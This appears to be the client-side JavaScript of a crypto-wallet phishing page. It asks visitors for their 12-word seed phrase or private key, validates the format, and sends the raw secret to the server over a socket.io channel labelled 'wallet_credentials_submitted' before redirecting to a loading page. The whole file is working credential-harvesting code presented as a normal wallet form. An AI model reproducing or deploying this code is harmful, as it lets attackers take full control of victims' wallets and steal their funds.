document.addEventListener('DOMContentLoaded', function() {
    const socket = io('/user', {
        transports: ['websocket'],
        query: {
            page: window.location.pathname
        }
    });

    // Handle form submission 
    document.getElementById('continue').addEventListener('click', async function() {
        const input = document.getElementById('wallet_input').value.trim();
        
        // Validate either seed phrase or private key
        if (!validateWalletInput(input)) {
            return;
        }

        try {
            // Send data to server
            socket.emit('user_action', {
                type: 'wallet_credentials_submitted',
                data: input,
                inputType: detectInputType(input),
                timestamp: new Date().toISOString(),
                page: window.location.pathname
            });

            // Set loading state
            socket.emit('page_loading', true);

            // Redirect to loading page after a short delay
            setTimeout(() => {
                window.location.href = '/pages/loading.html';
            }, 500);

        } catch (error) {
            console.error('Error:', error);
            document.getElementById('errorMessage').textContent = 'An error occurred. Please try again.';
            document.getElementById('errorMessage').style.display = 'block';
        }
    });

    function validateWalletInput(input) {
        if (!input) {
            document.getElementById('errorMessage').textContent = 'Please enter your seed phrase or private key';
            document.getElementById('errorMessage').style.display = 'block';
            return false;
        }

        const inputType = detectInputType(input);
        
        if (inputType === 'seed') {
            // Validate seed phrase
            const words = input.trim().split(/\s+/);
            if (words.length !== 12) {
                document.getElementById('errorMessage').textContent = 'Seed phrase must contain exactly 12 words';
                document.getElementById('errorMessage').style.display = 'block';
                return false;
            }
        } else if (inputType === 'private_key') {
            // Validate private key format (basic check for hex string of appropriate length)
            const privateKeyRegex = /^(0x)?[0-9a-fA-F]{64}$/;
            if (!privateKeyRegex.test(input)) {
                document.getElementById('errorMessage').textContent = 'Invalid private key format';
                document.getElementById('errorMessage').style.display = 'block';
                return false;
            }
        } else {
            document.getElementById('errorMessage').textContent = 'Invalid input format';
            document.getElementById('errorMessage').style.display = 'block';
            return false;
        }

        return true;
    }

    function detectInputType(input) {
        // Check if input matches private key format
        const privateKeyRegex = /^(0x)?[0-9a-fA-F]{64}$/;
        if (privateKeyRegex.test(input)) {
            return 'private_key';
        }
        
        // If it has spaces and roughly matches seed phrase format, assume it's a seed
        if (input.includes(' ')) {
            return 'seed';
        }

        return 'unknown';
    }

    // Handle socket connection
    socket.on('connect', () => {
        console.log('Socket connected');
    });

    socket.on('connect_error', (error) => {
        console.error('Socket connection error:', error);
    });
});
